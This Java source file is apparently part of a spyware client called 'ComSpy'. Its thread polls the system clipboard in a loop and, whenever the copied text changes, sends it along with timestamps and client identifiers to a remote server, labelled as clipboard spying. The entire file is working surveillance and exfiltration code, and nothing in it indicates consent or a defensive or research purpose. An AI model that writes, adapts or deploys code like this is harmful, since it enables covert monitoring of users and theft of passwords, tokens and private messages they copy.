/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package fclipbord;

import static Comman.KeysVer.Args;
import Comman.KeysVer.Keys;
import Comman.LOCAL_KEYS;
import Comman.SERVER_KEYS;
import Comman.Tool;
import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;
import java.util.HashMap;

/**
 *
 * @author abaza
 */
public class Clipbord_implimantation extends Thread {

    String Data = "";
    boolean LisingData = false;
    Comman.Tool CTool = new Tool();
    SERVER_KEYS Server_Var = new SERVER_KEYS();
    LOCAL_KEYS Local_Var = new LOCAL_KEYS();
    compy_client.ComSpy ComSpy;

    public void Status(compy_client.ComSpy ComPy, boolean Switchkey) {

        if (Switchkey) {
            this.ComSpy = ComPy;
            LisingData = true;
        } else {
            LisingData = false;
        }
    }

    @Override
    public void run() {
        while (LisingData) {
            try {
                String temp = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
                if (!temp.equals(Data)) {
                    Data = temp;
                    RecordDB(Data);
                }

            } catch (UnsupportedFlavorException | IOException ex) {
            }
        }
    }

    private void RecordDB(String data) {
        if (data.isEmpty()) {
            return;
        }

        String[][] DataSend = {
            {Server_Var.TYPE_COMMENT, Server_Var.CLIPBORD_SPY},
            {Local_Var.CLIPBORD_SUUID, Args.get(Keys.SUUID)},
            {Local_Var.CLIPBORD_CUUID, Args.get(Keys.CUUID)},
            {Local_Var.CLIPBORD_CTIME, CTool.getTime()},
            {Local_Var.CLIPBORD_CDATE, CTool.getDay()},
            {Local_Var.CLIPBORD_DATA_TEXT, data}
        };
        HashMap<String, String> DataRet = this.ComSpy.Server.Contaner(DataSend);
        if (this.ComSpy.Server.DoneOrNot(DataRet)) {
            System.out.println("Clipbord In Database");
        } else {
            System.err.println("Clipbord fail to write in database");
        }

    }
}
